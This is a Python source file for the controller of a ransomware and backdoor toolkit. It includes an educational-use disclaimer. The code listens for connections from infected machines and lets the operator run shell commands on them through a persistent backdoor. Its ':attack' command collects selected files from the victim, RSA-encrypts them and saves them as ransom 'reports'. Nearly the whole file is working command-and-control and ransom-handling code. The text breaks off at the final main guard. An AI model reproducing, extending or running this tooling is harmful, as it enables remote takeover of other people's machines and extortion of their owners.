# -*- coding: utf-8 -*-

# NOTICE: This script is intended to be used for educational purposes ONLY!
# NOTICE: I AM NEVER RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SCRIPT!
# NOTICE: NOR IS ANYONE ELSE BUT THE PERSON WHO EXECUTES THIS SCRIPT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SCRIPT!
# WARNING: PLEASE USE THIS SCRIPT INSIDE A VIRTUAL MACHINE OR SANDBOX ENVIRONMENT FOR YOUR SAFETY!

from helpers.networking import *

from plsp import Logger
from plsp.formatters.bundled import Time_Segment_Generator
from plsp.formatters.I_Final_Formatter import I_Final_Formatter
from plsp._Color_Configuration import Color_Configuration, A_Foreground_Color, A_Background_Color
from plsp.formatters.Logging_Segment_Generator import Logging_Segment

from base64 import b64decode, b64encode
from typing import Any
from datetime import datetime
import socket
import threading
import time
import json
import os







# Setup logging...
logger = Logger()

logger.set("global_context", "main")
logger.add_debug_context("main")
logger.add_debug_mode("info")
logger.add_debug_mode("detail")
logger.add_debug_mode("debug")

logger.contexts["main"].add_sink(
	"controller.log.txt"
)

my_time_sg = Time_Segment_Generator()
my_first_cc = Color_Configuration(
	A_Foreground_Color.BASIC_RED,
	A_Background_Color.BASIC_BRIGHT_BLACK
)
my_time_sg.day.color_config = my_first_cc
my_time_sg.month.color_config = my_first_cc
my_time_sg.year.color_config = my_first_cc
my_time_sg.hour.color_config = my_first_cc
my_time_sg.minute.color_config = my_first_cc
my_time_sg.second.color_config = my_first_cc
my_time_sg.microsecond.color_config = my_first_cc
my_time_sg.separator.color_config = Color_Configuration(
	A_Foreground_Color.BASIC_BLACK,
	A_Background_Color.BASIC_BRIGHT_BLACK
)
my_time_sg.date_separator.color_config = my_first_cc
my_time_sg.time_separator.color_config = my_first_cc
my_time_sg.second_microsecond_separator.color_config = my_first_cc

logger.contexts["main"].add_LSG(my_time_sg)

class my_final_formatter (I_Final_Formatter):
	def impl_handle(self, results: list[Logging_Segment], non_segments_string:"str") -> list[Logging_Segment]:
		return results+[
			Logging_Segment("NON_SEGMENT_1", f"\033[107m \033[0m "),
			Logging_Segment("NON_SEGMENT_2", non_segments_string)
		]

logger.contexts["main"].set_final_formatter(my_final_formatter())

logger.show("detail")







# Start...
logger().info("Starting controller.py...")

# Override the builtin print func to flush every time.
_OLD_PRINT = print
def print(*args, **kwargs):
	global _OLD_PRINT
	if "flush" in kwargs:
		raise Exception("You cannot specify the 'flush' keyword argument.")
	kwargs["flush"] = True
	_OLD_PRINT(*args, **kwargs)







W_BG = "\033[107m"
Y_FG = "\033[33m"
R_FG = "\033[31m"
RESET = "\033[0m"
HELP_MSG = f"""
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█                                                                                                 █
█ Custom Commands:                                                                                █
█   clear (or cls on windows)                                                                     █
█                   - Clear the screen.                                                           █
█   cd <dir>        - Change directory.                                                           █
█                                                                                                 █
█   {Y_FG}:help{RESET}           - Show this help message.                                                     █
█   {Y_FG}:return{RESET}         - Return to the main menu.                                                    █
█                                                                                                 █
█   {Y_FG}:select{RESET}         - Select file to encrypt.                                                     █
█   {Y_FG}:select-rec{RESET}     - Select files to encrypt recursively (An entire directory).                  █
█   {Y_FG}:remove{RESET}         - Remove previously selected file.                                            █
█   {Y_FG}:remove-rec{RESET}     - Remove previously selected files recursively (An entire directory).         █
█   {Y_FG}:list{RESET}           - list in tree form, all the files you have selected.                         █
█                                                                                                 █
█   {Y_FG}:attack{RESET}         - Attack the machine (Hold the selected files for ransom).                    █
█                                                                                                 █
█   {Y_FG}:FULLY_EXIT{RESET}     - Tell the persistent backdoor to exit.                                       █
█                                                                                                 █
█ Note:                                                                                           █
█   - We are using an incredibly simple but effective backdoor.                                   █
█     * It effectively uses `os.popen` to execute commands.                                       █
█     * {R_FG}It is not a full-fledged shell.{RESET}                                                           █
█   - With this backdoor, a new shell is created for each command.                                █
█     * This means that you cannot `cd` into a directory and then execute another command.        █
█     * Because of this we have implemented a `cd` command.                                       █
█   - The backdoor is not interactive.                                                            █
█     * This means that you cannot run a command that requires user input.                        █
█     * For example, you cannot run `sudo apt-get install <package>`.                             █
█                                                                                                 █
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
""".lstrip("\n")
FIRST_MSG = "If, at any time, you need help, type `:help`.\n"
FIRST_MSG += HELP_MSG

CANCEL_RECV_FLAG = new[bool](False).get_ref()
CANCEL_COMMAND_FLAG = new[bool](False).get_ref()
DO_PRINT_LOG = False
EXIT_FLAG = False
BIND_PORT = -1

RSA_PRIV_KEY_B = None
RSA_PRIV_KEY_A = None
RSA_PUBL_KEY_B = None
RSA_PUBL_KEY_A = None







class Terminal_Buffer:
	@property
	def close_file_every_x_calls(self) -> "int":
		return self._close_file_every_x_calls
	
	@close_file_every_x_calls.setter
	def close_file_every_x_calls(self, value:"int") -> None:
		if value < 1:
			raise ValueError("Expected a positive integer.")
		self._close_file_every_x_calls = value



	def __init__(self, name:"str", dir:"str") -> None:
		self.f_name = f".{name}.buff"
		self.d_name = dir

		self._exact_dir_path = os.path.abspath(self.d_name)
		self._exact_file_path = os.path.abspath(self.f_name)
		self._exact_full_path = os.path.join(self._exact_dir_path, self._exact_file_path)

		self._close_file_every_x_calls = 3
		self.__close_count_down = self._close_file_every_x_calls

		self.f = None
		
		self.__mode = None
		self.__is_using_bytes = None


		if not os.path.exists(self._exact_dir_path):
			os.mkdir(self._exact_dir_path)
		else:
			if os.path.isfile(self._exact_dir_path):
				raise Exception("Directory could not be created. A file with the same name already exists.")

		if not os.path.exists(self._exact_full_path):
			self.write_bytes(b"")



	def __close(self):
		if not self.__close_count_down == 0:
			raise Exception("Something horrible happened.")
		if not self.f:
			raise Exception("File is already closed.")
		self.f.close()

	def __open(self, mode:"str"):
		if self.close_file_every_x_calls < 1:
			raise ValueError("Something went wrong.")
		if self.f and self.f.closed == False:
			raise Exception("File is already open.")
		self.f = open(self._exact_full_path, mode)
		self.__mode = mode

	def __del__(self):
		if self.f:
			self.f.close()



	def __reopen_if_needed(self, mode:"str"):
		if self.__mode != mode:
			if self.f:
				self.f.close()
			self.__open(mode)
			self.__close_count_down = self.close_file_every_x_calls
			self.__mode = mode
		if self.__close_count_down == 0:
			self.__close()
			self.__open(mode)
			self.__close_count_down = self.close_file_every_x_calls
		else:
			self.__close_count_down -= 1



	def __encode(self, content:"bytes") -> "bytes":
		lines = content.split(b"\n")
		return b"\n".join([b64encode(line) for line in lines])

	def __decode(self, lines:"list[bytes]") -> "list[bytes]":
		return [b64decode(line)+b"\n" for line in lines]



	def write_bytes(self, content:"bytes"):
		if self.__is_using_bytes == None:
			self.__is_using_bytes = True
		assert self.__is_using_bytes == True, "Expected to be using bytes."
		self.__reopen_if_needed("wb")
		assert self.f
		self.f.write(
			self.__encode(content)
		)
		self.f.flush()

	def append_bytes(self, content:"bytes"):
		if self.__is_using_bytes == None:
			self.__is_using_bytes = True
		assert self.__is_using_bytes == True, "Expected to be using bytes."
		self.__reopen_if_needed("ab")
		assert self.f
		self.f.write(
			self.__encode(content)
		)
		self.f.flush()



	def write_text(self, content:"str"):
		if self.__is_using_bytes == None:
			self.__is_using_bytes = False
		assert self.__is_using_bytes == False, "Expected to be using plaintext."
		self.__reopen_if_needed("w")
		assert self.f
		self.f.write(content)
		self.f.flush()

	def append_text(self, content:"str"):
		if self.__is_using_bytes == None:
			self.__is_using_bytes = False
		assert self.__is_using_bytes == False, "Expected to be using plaintext."
		self.__reopen_if_needed("a")
		assert self.f
		self.f.write(content)
		self.f.flush()



	def read_lines_bytes(self) -> "list[bytes]":
		self.__reopen_if_needed("rb")
		assert self.f
		lines = self.f.readlines()
		return self.__decode(lines)



END_OF_COMMAND_SUFFIX = "\033[107m%\033[0m\n"
G_DICT_CLIENT_IS_BEING_INTERACTED_WITH:"dict[str,bool]" = {}
G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER:"dict[str,str]" = {}
G_DICT_CLIENT_IP_AND_SOCK_TUP:"dict[str,tuple]" = {}
G_DICT_CLIENT_NEEDS_INPUT:"dict[str,bool]" = {}
G_DICT_CLIENT_CONTROLLER:"dict[str,RSA_Crypto_ZLIB_Net_Controller]" = {}
G_DICT_CLIENT_BUFFER:"dict[str,Terminal_Buffer]" = {}






def _connection_reset_handler(controller:"RSA_Crypto_ZLIB_Net_Controller", _:"Exception|None") -> "None":
	global EXIT_FLAG
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_IP_AND_SOCK_TUP
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global G_DICT_CLIENT_CONTROLLER

	G_DICT_CLIENT_IS_BEING_INTERACTED_WITH.pop(controller.endpoint_address[0])
	G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER.pop(controller.endpoint_address[0])
	G_DICT_CLIENT_IP_AND_SOCK_TUP.pop(controller.endpoint_address[0])
	G_DICT_CLIENT_NEEDS_INPUT.pop(controller.endpoint_address[0])
	G_DICT_CLIENT_CONTROLLER.pop(controller.endpoint_address[0])
	G_DICT_CLIENT_BUFFER.pop(controller.endpoint_address[0])
	EXIT_FLAG = True


def _caught_make_prompt(addr) -> "str|None":
	global G_DICT_CLIENT_CONTROLLER
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	global G_DICT_CLIENT_NEEDS_INPUT
	global CANCEL_RECV_FLAG
	controller = G_DICT_CLIENT_CONTROLLER.get(addr[0], None)
	assert controller is not None

	while not G_DICT_CLIENT_NEEDS_INPUT[addr[0]] == True:
		if EXIT_FLAG == True:
			return None
		time.sleep(0.25)
		
	cwd = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
	user = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
	prompt = "\n"
	prompt += f"{RESET}{W_BG}{Y_FG} {user} "
	prompt += f"{RESET}{W_BG}{R_FG} at "
	prompt += f"{RESET}{W_BG}{Y_FG} {addr[0]} "
	prompt += f"{RESET}{W_BG}{R_FG} in "
	prompt += f"{RESET}{W_BG}{Y_FG} {cwd} "
	prompt += f"{RESET}\n"
	prompt += f"»» "
	G_DICT_CLIENT_BUFFER[addr[0]].append_bytes(prompt.encode())
	G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER[addr[0]] += prompt.lstrip("\n")
	return prompt



def make_prompt(addr) -> "str|None":
	try:
		return _caught_make_prompt(addr)
	except KeyError:
		return None



def _further_parse_time_str(string:str) -> str:
	rd_or_st_or_th = None
	day_part = string.split("-")[0]
	rest_part = "-".join(string.split("-")[1:])
	if day_part.endswith("1"):
		rd_or_st_or_th = "st"
	elif day_part.endswith("2"):
		rd_or_st_or_th = "nd"
	elif day_part.endswith("3"):
		rd_or_st_or_th = "rd"
	else:
		rd_or_st_or_th = "th"
	return f"{day_part}{rd_or_st_or_th}-{rest_part}"



#####################
# Handling a client #
#####################







def _caught_get_command(addr:"tuple", prompt:"str") -> "str|None":
	global EXIT_FLAG
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	logger().info(f"Attempting to receive input from hacker... client=@[{addr[0]}].")
	while not EXIT_FLAG:

		while not G_DICT_CLIENT_IS_BEING_INTERACTED_WITH[addr[0]] == True:
			if EXIT_FLAG == True:
				return None
			time.sleep(0.25)

		inp = input(prompt)
		G_DICT_CLIENT_NEEDS_INPUT[addr[0]] = False
		return inp

	return None



def get_command(addr:"tuple", prompt:"str") -> "str|None":
	try:
		return _caught_get_command(addr, prompt)
	except KeyError:
		return None








def handle_attack(addr:"tuple[str, int]"):
	global G_DICT_CLIENT_CONTROLLER
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_IP_AND_SOCK_TUP
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	logger().info("ENTER `handle_attack`.")
	logger().info(f"] ARG `addr` = [{addr}].")

	controller = G_DICT_CLIENT_CONTROLLER.get(addr[0], None)

	if controller is None:
		# We have closed the connection to the client.
		return

	logger().info(f"Requesting the list of file names to encrypt from the client @[{addr[0]}]...")
	msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
	assert msg == "BEGIN_FILE_LIST"
	files:"dict[str,str|None]" = {}
	while True:
		msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
		logger().info(f"Received file name: {msg}")
		if not msg:
			return
		if msg == "END_FILE_LIST":
			break
		files[msg] = None
	logger().info(f"Received {len(files)} file names.")
	logger().info(f"Requesting the contents of the files from the client @[{addr[0]}]...")
	msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
	assert msg == "BEGIN_FILE_CONTENTS"
	for file in files.keys():
		END_FILE_TOK = "END\x01FILE"
		encoded = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
		assert controller.recv(cancel_flag_p=CANCEL_RECV_FLAG) == END_FILE_TOK
		logger().info(f"Received contents of file [{file}]:\n")
		print(encoded, end="")
		files[file] = encoded
	assert controller.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "END_FILE_CONTENTS"
	logger().info(f"Received contents of all files.")

	assert isinstance(RSA_PUBL_KEY_A, int)
	assert isinstance(RSA_PUBL_KEY_B, int)
	assert isinstance(RSA_PRIV_KEY_A, int)
	assert isinstance(RSA_PRIV_KEY_B, int)
	rsa = RSA()
	rsa.set_public_key(RSA_PUBL_KEY_A, RSA_PUBL_KEY_B)
	rsa.set_private_key(RSA_PRIV_KEY_A, RSA_PRIV_KEY_B)
	encrypted_files:"dict[str,str]" = {}
	for f_name, contents in files.items():
		assert contents is not None
		encrypted = [str(x) for x in rsa.encrypt(contents)]
		encrypted_files[f_name] = ",".join(encrypted)

	report = {
		"files": encrypted_files
	}
	logger().info(f"Generated report: [{report}]")

	if not os.path.exists("reports"):
		os.mkdir("reports")
	else:
		if not os.path.isdir("reports"):
			raise Exception("A file named 'reports' already exists in the current directory")
	
	time_format_string = "%d-%m-%y_%H-%M-%S"
	time_str = datetime.now().strftime(time_format_string)
	time_str = _further_parse_time_str(time_str)
	from time import perf_counter_ns
	nanoseconds = perf_counter_ns() % 1_000_000_000
	time_str = time_str + "." + str(nanoseconds)[:-2]  # Last two digits are always `00`.
	save_name = f"reports/{addr[0]}_{time_str}.json"
	logger().info(f"Saving report to [{save_name}]...")
	with open(save_name, "w") as f:
		json.dump(report, f)
	
	print(f"\n\nReport saved to '{  os.path.abspath(save_name)  }.json'")

	logger().detail("EXIT `handle_attack`.")
	logger().detail(f"] ARG `addr` = [{addr}].")

	controller.send("DONE")

	G_DICT_CLIENT_CONTROLLER.pop(addr[0])
	G_DICT_CLIENT_IS_BEING_INTERACTED_WITH.pop(addr[0])
	G_DICT_CLIENT_BUFFER.pop(addr[0])
	G_DICT_CLIENT_NEEDS_INPUT.pop(addr[0])
	G_DICT_CLIENT_IP_AND_SOCK_TUP.pop(addr[0])
	G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER.pop(addr[0])



	




def _caught_handle_client(sock:"socket.socket", addr:"tuple[str, int]"):
	global G_DICT_CLIENT_CONTROLLER
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global EXIT_FLAG
	global CANCEL_RECV_FLAG
	logger().detail("ENTER `handle_client`.")
	logger().detail(f"] ARG `addr` = [{addr}].")
	logger().detail(f"] ARG `sock` = [{sock}].")
	endpoint_ip = addr[0]
	controller = None

	logger().info(f"Concocting a new Network_Controller for client @[{endpoint_ip}]...")
	controller = RSA_Crypto_ZLIB_Net_Controller(sock, addr, _connection_reset_handler)
	controller.conduct_handshake()
	logger().info(f"Network_Controller for client @[{endpoint_ip}] is ready.")
	G_DICT_CLIENT_BUFFER[endpoint_ip].append_bytes(FIRST_MSG.encode())
	G_DICT_CLIENT_CONTROLLER[endpoint_ip] = controller
	logger().info(f"Attempting to receive the OS name of the client @[{endpoint_ip}]...")
	endpoint_os_name = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
	if not endpoint_os_name:
		return
	logger().info(f"OS name of the client @[{endpoint_ip}] is [{endpoint_os_name}].")
	while not EXIT_FLAG:
		if G_DICT_CLIENT_BUFFER.get(endpoint_ip, None) == None:
			return
		buffer_lines = G_DICT_CLIENT_BUFFER[endpoint_ip].read_lines_bytes()
		first_run = len(buffer_lines) == 0
		if G_DICT_CLIENT_IS_BEING_INTERACTED_WITH.get(endpoint_ip, None) == None:
			return
		if (not first_run) and (not G_DICT_CLIENT_IS_BEING_INTERACTED_WITH[endpoint_ip]):
			continue
		_caught_inner_handle_client(sock, addr, endpoint_os_name)
		
	logger().detail("EXIT `handle_client`.")
	logger().detail(f"] ARG `addr` = [{addr}].")	
	logger().detail(f"] ARG `sock` = [{sock}].")



def handle_client(sock:"socket.socket", addr:"tuple[str, int]"):
	try:
		_caught_handle_client(sock, addr)
	except KeyError:
		return
		






def _caught_inner_handle_client(sock:"socket.socket", addr:"tuple[str, int]", endpoint_os_name:"str"):
	global EXIT_FLAG
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_CONTROLLER
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	global CANCEL_COMMAND_FLAG
	global CANCEL_RECV_FLAG
	logger().detail("ENTER `_handle_client`.")
	logger().detail(f"] ARG `addr` = [{addr}].")
	logger().detail(f"] ARG `sock` = [{sock}].")
	logger().detail(f"] ARG `endpoint_os_name` = [{endpoint_os_name}].")

	endpoint_ip = addr[0]
	controller:"RSA_Crypto_ZLIB_Net_Controller" = G_DICT_CLIENT_CONTROLLER[endpoint_ip]

	while not EXIT_FLAG:
		logger().info(f"Attempting to receive prompt string for client @[{endpoint_ip}]...")
		G_DICT_CLIENT_NEEDS_INPUT[endpoint_ip] = True
		prompt = make_prompt(addr)
		if prompt is None:
			return
		logger().info(f"Prompt string for client @[{endpoint_ip}] is [{prompt}].")
		command = get_command(addr, prompt)
		if command is None:
			break
		logger().info(f"Input received... client=@[{endpoint_ip}], command=[{command}].")
	
		if command == "":
			continue

		G_DICT_CLIENT_BUFFER[endpoint_ip].append_bytes(command.encode() + b"\n")
		logger().info(f"Sending command to client @[{endpoint_ip}]...")
		controller.send(command)

		if (endpoint_os_name != "nt" and command == "clear") or (endpoint_os_name == "nt" and command == "cls"):
			logger().info(f"Clearing the screen for client @[{endpoint_ip}]...")
			G_DICT_CLIENT_BUFFER[endpoint_ip].write_bytes(b"")
			clear_screen()
			continue

		if command == ":help":
			logger().info(f"Help message requested by hacker... client=@[{endpoint_ip}].")
			G_DICT_CLIENT_BUFFER[endpoint_ip].append_bytes(HELP_MSG.encode())
			print(HELP_MSG)
			continue

		if command == ":return":
			logger().info(f"Returning to the main menu... client=@[{endpoint_ip}].")
			G_DICT_CLIENT_IS_BEING_INTERACTED_WITH[endpoint_ip] = False
			return

		if command == ":attack":
			logger().info(f"Starting attack on client @[{endpoint_ip}]...")
			break

		if command == ":FULLY_EXIT":
			G_DICT_CLIENT_BUFFER.pop(endpoint_ip)
			G_DICT_CLIENT_CONTROLLER.pop(endpoint_ip)
			G_DICT_CLIENT_NEEDS_INPUT.pop(endpoint_ip)
			G_DICT_CLIENT_IS_BEING_INTERACTED_WITH.pop(endpoint_ip)
			G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER.pop(endpoint_ip)
			CANCEL_RECV_FLAG.set(True)
			return

		logger().info(f"Attempting to receive response from client @[{endpoint_ip}]...")

		response = ""
		while response != END_OF_COMMAND_SUFFIX:
			response = ""
			msg = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
			if not msg:
				return
			response += msg
			logger().debug(f"Received response from client @[{endpoint_ip}]:\n```{response}```")
			G_DICT_CLIENT_BUFFER[endpoint_ip].append_bytes(response.encode())
			print(response, end="")
			if CANCEL_COMMAND_FLAG.get() == True: 
				logger().info(f"Caught KeyboardInterrupt... client=@[{endpoint_ip}].")
				CANCEL_COMMAND_FLAG.set(False)
				controller.send("STOP")
				resp = controller.recv(cancel_flag_p=CANCEL_RECV_FLAG)
				if not resp:
					return
				G_DICT_CLIENT_BUFFER[endpoint_ip].append_bytes(resp.encode())
				print(resp, end="")
				controller.send("OK")
				break
			else:
				controller.send("OK")
	
	handle_attack(addr)

	logger().detail("EXIT `_handle_client`.")
	logger().detail(f"] ARG `addr` = [{addr}].")
	logger().detail(f"] ARG `sock` = [{sock}].")
	logger().detail(f"] ARG `endpoint_os_name` = [{endpoint_os_name}].")







#########################
# Establishing a client #
#########################







def handle_listen():
	global EXIT_FLAG
	global G_DICT_CLIENT_IP_AND_SOCK_TUP
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	logger().detail("ENTER `handle_listen`.")

	listener = socket.socket()
	listener.settimeout(5)
	BIND_ADDR = "0.0.0.0"
	logger().info(f"Binding to [{BIND_ADDR}:{BIND_PORT}]...")
	listener.bind((BIND_ADDR, BIND_PORT))
	logger().info("Listening...")
	listener.listen(5)

	while not EXIT_FLAG:
		prev_timeout = listener.gettimeout()
		try:

			listener.settimeout(1)
			sock, addr = listener.accept()
			logger().info(f"Accepted connection @[{addr[0]}].")
			sock.settimeout(500)  # Needed for slow PCs.
			sock.send(b"OK.")
			endpoint_ip = addr[0]

			if endpoint_ip not in G_DICT_CLIENT_IP_AND_SOCK_TUP.keys():
				G_DICT_CLIENT_IP_AND_SOCK_TUP[endpoint_ip] = ((addr, sock))
				G_DICT_CLIENT_BUFFER[endpoint_ip] = Terminal_Buffer(endpoint_ip, "buff")
				G_DICT_CLIENT_NEEDS_INPUT[endpoint_ip] = False
				G_DICT_CLIENT_IS_BEING_INTERACTED_WITH[endpoint_ip] = False
				G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER[endpoint_ip] = ""

				logger().info(f"Starting a new thread to handle client @[{endpoint_ip}]...")
				threading.Thread(target=handle_client, args=(sock, addr)).start()
			else:
				logger().info(f"Client @[{endpoint_ip}] is already connected... Skipping...")

		except socket.timeout:
			continue
		finally:
			listener.settimeout(prev_timeout)
	
	logger().detail("EXIT `handle_listen`.")







def clear_screen():
	os.system("cls" if os.name == "nt" else "clear")






def _handle_wants_to_interact(index:"int") -> "None":
	global G_DICT_CLIENT_IP_AND_SOCK_TUP
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_CONTROLLER
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	global CANCEL_COMMAND_FLAG
	logger().detail(f"ENTER `_handle_wants_to_interact`.")
	logger().detail(f"] ARG `index` = [{index}].")

	clear_screen()
	for i, (addr, __) in enumerate(G_DICT_CLIENT_IP_AND_SOCK_TUP.values()):
		if i == index:
			if not G_DICT_CLIENT_CONTROLLER.get(addr[0]):
				G_DICT_CLIENT_IP_AND_SOCK_TUP.pop(addr[0])
				break
			logger().info(f"Interacting with client @[{addr[0]}]...")
			buff = ""
			all_lines = G_DICT_CLIENT_BUFFER[addr[0]].read_lines_bytes()
			amount = 96
			if len(all_lines) < amount:
				amount = len(all_lines)
			some_lines = all_lines[-amount:]
			logger().debug(f"Printing last {amount} lines of the buffer...")
			buff_bytes = b"".join(some_lines)
			buff = buff_bytes.decode()
			do_ignore = G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER.get(addr[0], "")
			if do_ignore != "":
				logger().debug(f"Stripping the buffer of client @[{addr[0]}]...")
				logger().debug(f"Buffer before stripping: [[[{buff}]]]")
				buff = buff.rstrip(do_ignore)
				logger().debug(f"Buffer after stripping: [[[{buff}]]]")
				G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER[addr[0]] = ""
			logger().debug(f"Printing buffer of client @[{addr[0]}]...")
			logger().debug(f"Buffer: [[[{buff}]]]")
			print(buff+"\033[0m")
			G_DICT_CLIENT_IS_BEING_INTERACTED_WITH[addr[0]] = True
			G_DICT_CLIENT_NEEDS_INPUT[addr[0]] = True
			try:
				while G_DICT_CLIENT_IS_BEING_INTERACTED_WITH[addr[0]]:
					try:
						time.sleep(0.1)
						logger().debug(
							f"Waiting for interaction with @[{addr[0]}] to finish..."
						)
					except KeyboardInterrupt:
						logger().info(f"Caught KeyboardInterrupt... client=@[{addr[0]}].")
						G_DICT_CLIENT_BUFFER[addr[0]].append_bytes(b"^C")
						print("^C")
						CANCEL_COMMAND_FLAG.set(True)
					if CANCEL_COMMAND_FLAG.get() == True:
						while not CANCEL_COMMAND_FLAG.get() == False:
							try:
								logger().debug(
									"Waiting for CANCEL_COMMAND_FLAG to reset..."
								)
								time.sleep(0.1)
							except KeyboardInterrupt:
								G_DICT_CLIENT_BUFFER[addr[0]].append_bytes(b"^C")
								print("^C")
			except KeyError:
				pass
			break
	logger().detail("EXIT `_handle_wants_to_interact`.")







def _inner_main():
	global EXIT_FLAG
	global G_DICT_CLIENT_IP_AND_SOCK_TUP
	global G_DICT_CLIENT_BUFFER
	global G_DICT_CLIENT_NEEDS_INPUT
	global G_DICT_CLIENT_CONTROLLER
	global G_DICT_CLIENT_IS_BEING_INTERACTED_WITH
	global G_DICT_CLIENT_TO_BE_RSTRIPPED_BUFFER
	global CANCEL_COMMAND_FLAG
	global CANCEL_RECV_FLAG
	logger().detail("ENTER `_inner_main`.")
	first_run = True
	do_want_to_interact = None
	while not EXIT_FLAG:
	
		if do_want_to_interact is not None:
			index = do_want_to_interact
			do_want_to_interact = None
			_handle_wants_to_interact(index)
			continue

		main_menu_help = ""
		main_menu_help += "Welcome to the main menu.\n"
		main_menu_help += "\nCommands:\n"
		main_menu_help += " - list              ::: list available clients.\n"
		main_menu_help += " - interact <index>  ::: control the client using our backdoor. :D\n"
		main_menu_help += " - exit              ::: exit the controller.\n"
		main_menu_help += " - help              ::: show this help message.\n"
		main_menu_help += " - info              ::: toggle `info` logging level.\n"
		main_menu_help += " - detail            ::: toggle `detail` logging level. >info\n"
		main_menu_help += " - debug             ::: toggle `debug` logging level. >detail\n"
		main_menu_help += " - toggle_print_log  ::: toggle printing logs to the console. The logs will always be saved to the log file.\n"
		main_menu_help += "\nA few things for your convenience...\n"
		main_menu_help += " - You can simply type +<index> to interact with a client.\n"
		main_menu_help += "     For example, `+0` will interact with the first client in the list.\n"
		main_menu_help += " - Also, to enter any other command, simply type `]<command>`.\n"
		main_menu_help += "     For example, `]ls -la` will list all files in the current directory"
		main_menu_help       += " (ON YOUR LOCAL MACHINE).\n"
		if first_run:
			print(main_menu_help)
			first_run = False

		logger().detail("Waiting for command from stdin...")
		command = input("\n[controller] HOME --> ")
		logger().info(f"Received command from stdin: [{command}].")

		if command == "help":
			print(main_menu_help)

		elif command == "list":
			logger().detail("Listing connected clients...")
			if len(G_DICT_CLIENT_IP_AND_SOCK_TUP) == 0:
				print("No connected clients.")
				continue
			print("Connected clients:")
			for i, (addr, __) in enumerate(G_DICT_CLIENT_IP_AND_SOCK_TUP.values()):
				if not G_DICT_CLIENT_CONTROLLER.get(addr[0]):
					continue
				logger().debug(f"Client = [{i}] '{addr[0]}'...")
				print(f" - [{i}] '{addr[0]}'...")

		elif command == "exit":
			logger().detail("Executing `exit` command...")
			EXIT_FLAG = True
			CANCEL_RECV_FLAG.set(True)

		elif command.startswith("]"):
			command = command.lstrip("]")
			logger().info(f"Executing command on attacker machine: [{command}].")
			is_cd_command = command.startswith("cd")
			if is_cd_command:
				dir = command.lstrip("cd").strip()
				os.chdir(dir)
				continue
			os.system(command)

		elif command.startswith("+"):
			try:
				index = int(command.lstrip("+"))
				do_want_to_interact = index
			except IndexError or ValueError:
				print("Invalid index")

		elif command.startswith("interact"):
			try:
				index = int(command.lstrip("interact "))
				do_want_to_interact = index
			except IndexError:
				print("Invalid index")

		elif command == "info":
			logger.show("info")
		
		elif command == "detail":
			logger.show("detail")
		
		elif command == "debug":
			logger.show("debug")

		elif command == "toggle_print_log":
			global DO_PRINT_LOG
			if DO_PRINT_LOG == True:
				DO_PRINT_LOG = False
				logger.contexts["main"].del_sink(
					sys.stdout,
				)
			else:
				DO_PRINT_LOG = True
				logger.contexts["main"].add_sink(
					sys.stdout,
				)

		elif command == "":
			continue

		else:
			logger().info(f"Invalid command: [{command}].")
			print("Invalid command")

	logger().detail("EXIT `_inner_main`.")







def main():
	global EXIT_FLAG
	logger().detail("ENTER `main`.")

	logger().info("Starting the listener thread...")
	listen_thread = threading.Thread(target=handle_listen)
	listen_thread.start()
	logger().info("Listener thread started.")

	_inner_main()
	listen_thread.join()

	logger().detail("EXIT `main`.")







if __name__ == "__main__":
